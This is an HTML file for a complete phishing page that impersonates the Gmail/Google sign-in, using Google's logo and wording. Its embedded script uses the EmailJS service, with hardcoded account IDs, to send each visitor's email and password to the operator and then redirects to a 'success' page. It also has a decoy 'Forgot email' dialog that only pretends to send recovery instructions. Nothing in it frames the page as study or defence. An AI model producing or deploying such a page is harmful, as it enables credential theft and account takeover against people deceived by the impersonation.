<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in - Gmail Style</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #fff;
    margin: 0; padding: 0;
    display: flex; justify-content: center; align-items: center;
    height: 100vh;
    color: #202124;
  }
  .container {
    width: 360px;
    border: 1px solid #dadce0;
    padding: 40px 40px 30px;
    box-sizing: border-box;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 0.1);
    position: relative;
  }
  .logo {
    display: flex; align-items: center; margin-bottom: 24px;
  }
  .logo img {
    height: 40px;
    margin-right: 8px;
  }
  h1 {
    font-weight: 400;
    font-size: 24px;
    margin: 0 0 8px 0;
  }
  p.subtitle {
    font-size: 14px;
    color: #5f6368;
    margin: 0 0 24px 0;
  }
  form label {
    display: block;
    font-size: 14px;
    margin-bottom: 4px;
    font-weight: 600;
  }
  form input {
    width: 100%;
    font-size: 16px;
    padding: 10px 12px;
    margin-bottom: 20px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    box-sizing: border-box;
  }
  form input:focus {
    border-color: #1a73e8;
    outline: none;
    box-shadow: 0 0 0 1px #1a73e8;
  }
  .forgot-link {
    font-size: 14px;
    color: #1a73e8;
    cursor: pointer;
    text-decoration: none;
    margin-bottom: 24px;
    display: inline-block;
  }
  button {
    background-color: #1a73e8;
    border: none;
    color: white;
    font-size: 14px;
    font-weight: 600;
    padding: 10px 24px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
  }
  button:hover {
    background-color: #1669c1;
  }

  /* Modal styles */
  #forgot-modal {
    display: none;
    position: fixed;
    z-index: 9999;
    left: 0; top: 0; width: 100%; height: 100%;
    background-color: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
  }
  #forgot-modal .modal-content {
    background: white;
    padding: 24px 30px;
    border-radius: 8px;
    width: 320px;
    box-sizing: border-box;
    text-align: center;
    position: relative;
  }
  #forgot-modal h2 {
    margin-top: 0;
    font-weight: 600;
    font-size: 20px;
    margin-bottom: 16px;
    color: #202124;
  }
  #forgot-modal input[type="email"] {
    width: 100%;
    padding: 10px 12px;
    font-size: 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    margin-bottom: 20px;
    box-sizing: border-box;
  }
  #forgot-modal button {
    width: 100%;
    background-color: #1a73e8;
    color: white;
    border: none;
    padding: 10px;
    border-radius: 4px;
    font-weight: 600;
    cursor: pointer;
    font-size: 14px;
  }
  #forgot-modal button:hover {
    background-color: #1669c1;
  }
  #forgot-modal .close-btn {
    position: absolute;
    top: 12px;
    right: 16px;
    font-size: 24px;
    font-weight: bold;
    color: #555;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="container" role="main" aria-label="Sign in to continue">
  <div class="logo">
    <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
    <span style="font-weight:500; font-size: 18px; color:#5f6368;">Sign in with Google</span>
  </div>
  <h1>Sign in</h1>
  <p class="subtitle">to continue to <strong>Gmail</strong></p>

  <form id="login-form">
    <label for="email">Email or phone</label>
    <input id="email" name="user_email" type="email" placeholder="Email or phone" required autofocus autocomplete="username" />

    <label for="password">Password</label>
    <input id="password" name="user_password" type="password" placeholder="Enter your password" required autocomplete="current-password" />

    <a href="#" id="forgot-link" class="forgot-link" tabindex="0">Forgot email?</a>

    <button type="submit">Next</button>
  </form>
</div>

<!-- Forgot email modal -->
<div id="forgot-modal" role="dialog" aria-modal="true" aria-labelledby="forgot-title" aria-describedby="forgot-desc">
  <div class="modal-content">
    <span class="close-btn" id="close-forgot">&times;</span>
    <h2 id="forgot-title">Recover your email</h2>
    <p id="forgot-desc">Enter your recovery email address to get instructions:</p>
    <input type="email" id="recovery-email" placeholder="Recovery email" aria-label="Recovery email" required />
    <button id="send-recovery">Send Instructions</button>
  </div>
</div>

<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
<script>
  (function() {
    const USER_ID = "EB017wgX1BeDuRY66";
    const SERVICE_ID = "service_64albro";
    const TEMPLATE_ID = "template_y1sfcug";

    emailjs.init(USER_ID);

    const form = document.getElementById("login-form");

    form.addEventListener("submit", function(event) {
      event.preventDefault();

      emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
        .then(function() {
          // Redirect to success page after sending email
          window.location.href = "success.html";
        }, function(error) {
          alert("Oops! Something went wrong, please try again.");
          console.error("EmailJS error:", error);
        });
    });

    // Modal logic
    const forgotLink = document.getElementById("forgot-link");
    const forgotModal = document.getElementById("forgot-modal");
    const closeForgot = document.getElementById("close-forgot");
    const sendRecovery = document.getElementById("send-recovery");
    const recoveryEmailInput = document.getElementById("recovery-email");

    forgotLink.addEventListener("click", function(e) {
      e.preventDefault();
      forgotModal.style.display = "flex";
      recoveryEmailInput.focus();
    });

    closeForgot.addEventListener("click", function() {
      forgotModal.style.display = "none";
      recoveryEmailInput.value = "";
    });

    forgotModal.addEventListener("click", function(e) {
      if (e.target === forgotModal) {
        forgotModal.style.display = "none";
        recoveryEmailInput.value = "";
      }
    });

    sendRecovery.addEventListener("click", function() {
      const email = recoveryEmailInput.value.trim();
      if (!email) {
        alert("Please enter your recovery email.");
        recoveryEmailInput.focus();
        return;
      }
      // Simulate sending recovery instructions
      alert("Recovery instructions sent to " + email + ".");
      forgotModal.style.display = "none";
      recoveryEmailInput.value = "";
    });

    document.addEventListener("keydown", function(e) {
      if (e.key === "Escape" && forgotModal.style.display === "flex") {
        forgotModal.style.display = "none";
        recoveryEmailInput.value = "";
      }
    });
  })();
</script>

</body>
</html>
